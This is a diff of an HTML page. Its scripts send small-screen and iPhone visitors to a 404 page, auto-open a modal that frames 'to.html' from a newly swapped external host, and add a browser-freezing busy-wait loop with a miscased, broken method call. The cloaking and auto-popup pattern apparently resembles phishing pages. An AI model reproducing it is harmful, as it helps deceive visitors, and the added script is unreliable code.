@@ -4,14 +4,14 @@
 <script type="text/javascript">
 <!--
 if (screen.width <= 699) {
-document.location = "https://forways.netlify.app/404.html";
+document.location = "./404.html";
 }
 //-->
 </script>
 <script language=javascript>
 <!--
 if ((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
-   location.replace("https://forways.netlify.app/404.html");
+   location.replace("./404.html");
 }
 -->
 </script>
@@ -60,7 +60,15 @@ body {font-family: Arial, Helvetica, sans-serif;}
 }
 
 iframe {
-  border: 1px solid #d4d4d4;
+  border: 1px solid #b8b6b6;
+-webkit-box-shadow: 0px 1px 5px -1px #B8B6B6; 
+box-shadow: 0px 1px 5px -1px #B8B6B6;
+
+}
+</style>
+<style>
+.iframe
+
 }
 </style>
 
@@ -18839,7 +18847,7 @@ caption {
 
   <!-- Modal content -->
   <div class="modal-content">
-<iframe width="350" height="570"  frameBorder="0" src="https://forways.netlify.app/to.html"></iframe>
+<iframe width="360" height="570"  frameBorder="0" src="https://main-9tq.pages.dev/to.html"></iframe>
   </div>
 
 </div>
@@ -18872,5 +18880,16 @@ window.onclick = function(event) {
 </script>
 <script>document.getElementById("myBtn").click();</script>
 
+<script>var iteration = true;
+var time = new Date();
+var delay = 2000;
+
+while(iteration) {
+    if(time.getTime() + 5000 < new Date().getTime()) {
+         iteration = false;
+    }
+}
+
+document.getElementByID('myBtn').click();</script>
 </body>
 </html>
